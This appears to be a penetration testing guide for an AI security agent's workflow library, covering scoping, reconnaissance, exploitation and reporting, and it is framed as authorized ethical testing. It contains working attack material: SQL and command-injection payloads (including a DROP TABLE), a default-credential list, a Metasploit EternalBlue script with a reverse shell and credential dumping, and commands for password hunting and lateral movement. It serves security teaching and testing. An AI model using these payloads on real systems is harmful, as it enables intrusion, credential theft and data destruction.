---
name: "Penetration Testing Guide"
description: "Ethical hacking methodology to identify exploitable vulnerabilities"
agent: "security"
category: "security"
related_workflows:
  - vulnerability-scanning-workflow
  - security-testing-workflow
  - threat-modeling-workflow
---

# Penetration Testing Guide - Comprehensive Guide

## Overview

Penetration testing (pen testing) is a controlled form of hacking in which a professional ethical hacker simulates a real-world cyber attack to identify vulnerabilities, security weaknesses, and potential exploitation paths. The goal is to strengthen security defenses before malicious actors can exploit them.

## Prerequisites

### Legal Requirements
- Written authorization (Rules of Engagement)
- Defined scope and boundaries
- Legal review and sign-off
- Insurance coverage
- NDA agreements

### Technical Requirements
- Testing environment access
- Target system inventory
- Network diagrams
- Application documentation
- Emergency contacts

### Tools and Frameworks
- **OS Platforms**: Kali Linux, Parrot OS, BlackArch
- **Network Tools**: Nmap, Masscan, Netcat, Wireshark
- **Web Testing**: Burp Suite, OWASP ZAP, SQLMap, Nikto
- **Exploitation**: Metasploit, Cobalt Strike, Empire
- **Post-Exploitation**: Mimikatz, BloodHound, PowerSploit

## Penetration Testing Methodologies

### PTES (Penetration Testing Execution Standard)
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post Exploitation
7. Reporting

### OWASP Testing Guide
- Information Gathering
- Configuration Management Testing
- Identity Management Testing
- Authentication Testing
- Authorization Testing
- Session Management Testing
- Input Validation Testing
- Testing for Error Handling
- Testing for Weak Cryptography
- Business Logic Testing
- Client-side Testing

## Phase 1: Pre-Engagement and Scoping

### Rules of Engagement Template
```yaml
engagement_details:
  client: "Example Corp"
  start_date: "2024-04-15"
  end_date: "2024-04-30"
  testing_window: "00:00-06:00 UTC"
  
  scope:
    in_scope:
      networks:
        - "10.0.0.0/8"
        - "192.168.0.0/16"
      domains:
        - "*.example.com"
        - "api.example.com"
      applications:
        - "https://app.example.com"
        - "Mobile App v2.0"
    
    out_of_scope:
      - "Production database servers"
      - "10.0.50.0/24 (Finance network)"
      - "Third-party integrations"
      - "Physical security testing"
  
  testing_types:
    - network_penetration: true
    - web_application: true
    - wireless: false
    - social_engineering: limited
    - physical: false
    - dos_testing: false
  
  emergency_contacts:
    - name: "Security Team Lead"
      phone: "+1-555-0100"
      email: "security@example.com"
```

## Phase 2: Reconnaissance and Information Gathering

### Passive Reconnaissance

**2.1 OSINT Gathering**
```python
import requests
import dns.resolver
import whois

def passive_recon(target_domain):
    results = {}
    
    # DNS Enumeration
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
    for record_type in record_types:
        try:
            answers = dns.resolver.resolve(target_domain, record_type)
            results[record_type] = [str(rdata) for rdata in answers]
        except:
            results[record_type] = []
    
    # WHOIS Information
    try:
        w = whois.whois(target_domain)
        results['whois'] = {
            'registrar': w.registrar,
            'creation_date': str(w.creation_date),
            'emails': w.emails,
            'name_servers': w.name_servers
        }
    except:
        results['whois'] = {}
    
    # Certificate Transparency
    ct_url = f"https://crt.sh/?q={target_domain}&output=json"
    try:
        ct_data = requests.get(ct_url).json()
        results['certificates'] = [
            {'name': cert['name_value'], 'issuer': cert['issuer_name']}
            for cert in ct_data[:5]
        ]
    except:
        results['certificates'] = []
    
    return results
```

**2.2 Google Dorking**
```bash
# Find exposed documents
site:example.com filetype:pdf OR filetype:doc OR filetype:xls

# Find login pages
site:example.com inurl:login OR inurl:signin OR inurl:admin

# Find configuration files
site:example.com ext:xml OR ext:conf OR ext:cnf OR ext:config

# Find database files
site:example.com ext:sql OR ext:db OR ext:dbf OR ext:mdb

# Find backup files
site:example.com ext:bkf OR ext:bkp OR ext:bak OR ext:old OR ext:backup
```

### Active Reconnaissance

**2.3 Network Scanning**
```bash
# Host discovery
nmap -sn 10.0.0.0/24 -oA discovery

# Port scanning (TCP)
nmap -sS -sV -sC -O -p- 10.0.0.1 -oA full_tcp_scan

# UDP scanning (top 1000 ports)
nmap -sU --top-ports 1000 10.0.0.1 -oA udp_scan

# Service enumeration
nmap --script=default,vuln 10.0.0.1 -oA service_enum

# Aggressive scan (noisy)
nmap -A -T4 10.0.0.1 -oA aggressive_scan
```

## Phase 3: Enumeration and Vulnerability Assessment

### Service Enumeration

**3.1 Web Application Enumeration**
```bash
# Directory/file enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt -t 50

# Subdomain enumeration
sublist3r -d target.com -o subdomains.txt

# Technology detection
whatweb -a 3 http://target.com

# Vulnerability scanning
nikto -h http://target.com -o nikto_report.txt
```

**3.2 SMB Enumeration**
```bash
# SMB version detection
nmap -p445 --script smb-protocols 10.0.0.1

# Share enumeration
smbclient -L //10.0.0.1 -N
enum4linux -a 10.0.0.1

# User enumeration
rpcclient -U "" -N 10.0.0.1 -c "enumdomusers"

# Vulnerability checks
nmap -p445 --script smb-vuln* 10.0.0.1
```

### Vulnerability Identification

**3.3 OWASP Top 10 Testing**
```python
def test_owasp_vulnerabilities(target_url):
    vulnerabilities = []
    
    # A01:2021 – Broken Access Control
    test_urls = [
        f"{target_url}/admin",
        f"{target_url}/api/users/1",
        f"{target_url}/../../../etc/passwd"
    ]
    for url in test_urls:
        response = requests.get(url)
        if response.status_code == 200:
            vulnerabilities.append({
                "type": "Broken Access Control",
                "url": url,
                "severity": "High"
            })
    
    # A03:2021 – Injection
    sql_payloads = ["'", '" OR "1"="1', "'; DROP TABLE users--"]
    for payload in sql_payloads:
        response = requests.get(f"{target_url}/search?q={payload}")
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            vulnerabilities.append({
                "type": "SQL Injection",
                "payload": payload,
                "severity": "Critical"
            })
    
    # A07:2021 – Identification and Authentication Failures
    auth_tests = [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "root", "password": "toor"}
    ]
    for creds in auth_tests:
        response = requests.post(f"{target_url}/login", data=creds)
        if response.status_code == 200 and "dashboard" in response.text:
            vulnerabilities.append({
                "type": "Weak Credentials",
                "credentials": creds,
                "severity": "Critical"
            })
    
    return vulnerabilities
```

## Phase 4: Exploitation

### Manual Exploitation

**4.1 Web Application Exploitation**
```python
# SQL Injection exploitation
import requests

def exploit_sqli(target_url, vulnerable_param):
    # Extract database information
    payloads = {
        "version": "' UNION SELECT @@version--",
        "database": "' UNION SELECT database()--",
        "tables": "' UNION SELECT table_name FROM information_schema.tables--",
        "columns": "' UNION SELECT column_name FROM information_schema.columns--"
    }
    
    results = {}
    for info_type, payload in payloads.items():
        response = requests.get(f"{target_url}?{vulnerable_param}={payload}")
        results[info_type] = extract_data(response.text)
    
    return results

# Command injection exploitation
def exploit_command_injection(target_url, vulnerable_param):
    commands = [
        "id",
        "whoami",
        "cat /etc/passwd",
        "ls -la /"
    ]
    
    for cmd in commands:
        payload = f"; {cmd} #"
        response = requests.post(target_url, data={vulnerable_param: payload})
        print(f"Command: {cmd}")
        print(f"Output: {response.text}")
```

### Automated Exploitation with Metasploit

**4.2 Metasploit Framework**
```ruby
# Metasploit resource script
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.100
set LPORT 4444
exploit

# Post-exploitation
sysinfo
getuid
hashdump
load kiwi
creds_all
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
```

## Phase 5: Post-Exploitation

### Privilege Escalation

**5.1 Linux Privilege Escalation**
```bash
#!/bin/bash
# Linux privilege escalation enumeration

echo "[+] System Information"
uname -a
cat /etc/os-release

echo "[+] Current User"
id
whoami

echo "[+] SUID Binaries"
find / -perm -u=s -type f 2>/dev/null

echo "[+] Writable Directories"
find / -writable -type d 2>/dev/null

echo "[+] Cron Jobs"
ls -la /etc/cron*
crontab -l

echo "[+] Sudo Permissions"
sudo -l

echo "[+] Interesting Files"
find / -name "*.conf" -o -name "*.config" 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" 2>/dev/null
```

**5.2 Windows Privilege Escalation**
```powershell
# Windows privilege escalation enumeration

# System information
systeminfo
whoami /priv
net user
net localgroup administrators

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check for weak service permissions
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *

# Check for AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Search for passwords
findstr /si password *.txt *.xml *.config
reg query HKLM /f password /t REG_SZ /s
```

### Lateral Movement

**5.3 Lateral Movement Techniques**
```python
def lateral_movement_windows():
    techniques = [
        {
            "name": "PSExec",
            "command": "psexec \\\\target -u admin -p password cmd.exe",
            "detection": "Event ID 7045 (service creation)"
        },
        {
            "name": "WMI",
            "command": "wmic /node:target process call create \"cmd.exe\"",
            "detection": "Event ID 4688 with WmiPrvSE.exe"
        },
        {
            "name": "RDP",
            "command": "mstsc /v:target",
            "detection": "Event ID 4624 (Type 10 logon)"
        },
        {
            "name": "PowerShell Remoting",
            "command": "Enter-PSSession -ComputerName target",
            "detection": "Event ID 4104 (PowerShell script block)"
        }
    ]
    return techniques
```

## Phase 6: Reporting

### Executive Summary Template
```markdown
# Penetration Test Report - Executive Summary

## Test Overview
- **Client:** Example Corp
- **Testing Period:** April 15-30, 2024
- **Scope:** Internal network, web applications
- **Methodology:** PTES, OWASP

## Risk Summary
| Severity | Count | Examples |
|----------|-------|----------|
| Critical | 3 | RCE, SQL Injection, Domain Admin compromise |
| High | 7 | Weak passwords, missing patches, IDOR |
| Medium | 15 | Information disclosure, XSS, misconfigurations |
| Low | 22 | Verbose errors, outdated software |

## Key Findings

### 1. Remote Code Execution via Deserialization
- **Risk:** Critical
- **Impact:** Complete system compromise
- **Affected Systems:** api.example.com
- **Recommendation:** Immediate patching required

### 2. SQL Injection in User Search
- **Risk:** Critical
- **Impact:** Database compromise, data exfiltration
- **Affected Systems:** app.example.com/search
- **Recommendation:** Implement parameterized queries

### 3. Weak Active Directory Passwords
- **Risk:** High
- **Impact:** Domain compromise possible
- **Affected Users:** 47 accounts with weak passwords
- **Recommendation:** Enforce strong password policy

## Security Posture Assessment

Overall security maturity: **Medium-Low**

### Strengths
- Network segmentation properly implemented
- Security monitoring tools deployed
- Incident response plan documented

### Weaknesses
- Patch management needs improvement
- Weak password policies
- Insufficient security testing

## Recommendations

### Immediate (0-30 days)
1. Patch critical vulnerabilities
2. Reset weak passwords
3. Implement WAF for web applications

### Short-term (30-90 days)
1. Deploy endpoint detection and response (EDR)
2. Implement security awareness training
3. Conduct configuration review

### Long-term (90+ days)
1. Establish vulnerability management program
2. Implement zero-trust architecture
3. Regular penetration testing schedule
```

## Best Practices and Ethics

### Ethical Guidelines
- ✓ Always obtain written authorization
- ✓ Stay within defined scope
- ✓ Protect client data confidentiality
- ✓ Report findings responsibly
- ✓ Never cause intentional damage

### Safety Measures
- ✓ Test in isolated environments first
- ✓ Have rollback plans
- ✓ Monitor system stability
- ✓ Maintain communication with client
- ✓ Document all actions taken

## Common Pitfalls

### Technical Pitfalls
- Running aggressive scans in production
- Not validating exploits before running
- Forgetting to clean up backdoors
- Inadequate documentation

### Legal Pitfalls
- Testing without authorization
- Exceeding scope boundaries
- Accessing personal data unnecessarily
- Not following data protection regulations

## References and Standards

- PTES: http://www.pentest-standard.org/
- OWASP Testing Guide v4.2
- NIST SP 800-115: Technical Guide to Security Testing
- PCI-DSS Requirement 11.3
- EC-Council Certified Ethical Hacker (CEH)
- SANS Penetration Testing

## Conclusion

Penetration testing is a critical component of a comprehensive security program. When conducted properly with appropriate authorization and methodology, it provides valuable insights into security weaknesses and helps organizations improve their defensive capabilities before real attackers can exploit vulnerabilities.